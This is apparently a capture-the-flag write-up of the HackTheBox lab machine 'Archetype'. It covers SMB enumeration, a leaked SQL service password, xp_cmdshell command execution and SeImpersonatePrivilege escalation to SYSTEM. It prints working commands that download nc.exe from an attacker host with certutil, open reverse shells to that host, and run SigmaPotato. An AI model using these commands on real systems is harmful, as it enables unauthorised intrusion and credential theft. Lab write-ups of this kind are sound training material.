---
title: Archetype
image:
    path: /assets/posts/2025-12-05-archetype/1.png
date: 2025-12-05 18:12:00 +/-TTTT
categories: [HackTheBox]
tags: [HackTheBox, Port 445, SMB, Port 1433, MSSQL, SeImpersonatePrivilege, PrintSpoofer, xp_cmdshell, PowerShell History]
---

---

## Enumeration

```
❯ nmap 10.129.3.153
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 18:51 -03
Nmap scan report for 10.129.3.153 (10.129.3.153)
Host is up (0.27s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
5985/tcp open  wsman
```

```
❯ nmap 10.129.3.153 -sCV
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 18:59 -03
Nmap scan report for 10.129.3.153 (10.129.3.153)
Host is up (0.35s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.3.153:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.3.153:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-12-06T01:04:42+00:00; +3h00m20s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-12-06T00:50:26
|_Not valid after:  2055-12-06T00:50:26
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-12-05T17:04:27-08:00
| smb2-time: 
|   date: 2025-12-06T01:04:24
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 4h36m21s, deviation: 3h34m42s, median: 3h00m20s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

## Port 4445 - SMB

```
❯ smbclient -N -L //10.129.3.153

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.3.153 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
❯ smbclient -N //10.129.3.153/backups
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 09:20:57 2020
  ..                                  D        0  Mon Jan 20 09:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 09:23:02 2020

		5056511 blocks of size 4096. 2573600 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
```

```
❯ cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

We have user sql_svc with password M3g4c0rp123

## Port 1433 - MSSQL

```
❯ impacket-mssqlclient sql_svc:M3g4c0rp123@10.129.3.153 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT @@version;
                                                                                                                                                                                                                              
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) 
	Aug 22 2017 17:04:49 
	Copyright (C) 2017 Microsoft Corporation
	Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
```

```
SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT name FROM sys.databases;
name     
------   
master   

tempdb   

model    

msdb
```

```
SQL (ARCHETYPE\sql_svc  dbo@master)> EXECUTE sp_configure 'show advanced options', 1;
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1;
INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'whoami';
output              
-----------------   
archetype\sql_svc   

NULL
```

In my attacker machine open the port 8023 to host a nc.exe and open with nc port 43
```
❯ ls
nc.exe  prod.dtsConfig
❯ python3 -m http.server 8023
```

```
nc -lvnp 443
listening on [any] 443 ...
```

```
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'whoami';
output              
-----------------   
archetype\sql_svc   

NULL                

SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.14.106:8023/nc.exe c:/windows/temp/nc.exe';
output                                                
---------------------------------------------------   
****  Online  ****                                    

CertUtil: -URLCache command completed successfully.   

NULL
```

```
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE;
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'c:\windows\temp\nc.exe -e cmd.exe 10.10.14.106 443';
```

```
C:\Users\sql_svc\Desktop>type user.txt
type user.txt
3e7XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

```
C:\Users\sql_svc\Desktop>whoami /all
whoami /all

USER INFORMATION
----------------

...

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

## SeImpersonatePrivilege

```
PS C:\Users\sql_svc> .\SigmaPotato.exe --revshell 10.10.14.106 3333                                                    
.\SigmaPotato.exe --revshell 10.10.14.106 3333
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 848 | Token: 0x840 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 996
[+] Current Command Length: 10 characters
---
[+] Creating a simple PowerShell reverse shell...
[+] IP Address: 10.10.14.106 | Port: 3333
[+] Bootstrapping to an environment variable...
[+] Payload base64 encoded and set to local environment variable: '$env:SigmaBootstrap'
[+] Environment block inherited local environment variables.
[+] New Command to Execute: 'powershell -c (powershell -e $env:SigmaBootstrap)'
[+] Setting 'CREATE_UNICODE_ENVIRONMENT' process flag.
---
[+] Creating Process via 'CreateProcessAsUserW'
[+] Process Started with PID: 2776

[+] Process Output:
```

```
nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.10.14.106] from (UNKNOWN) [10.129.3.153] 49689
whoami
nt authority\system
PS C:\Users\sql_svc> cd C:\Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> type root.txt
bXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
PS C:\Users\Administrator\Desktop> 
```

Ps,ps....tha password of admin is in:
```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_History.txt
```

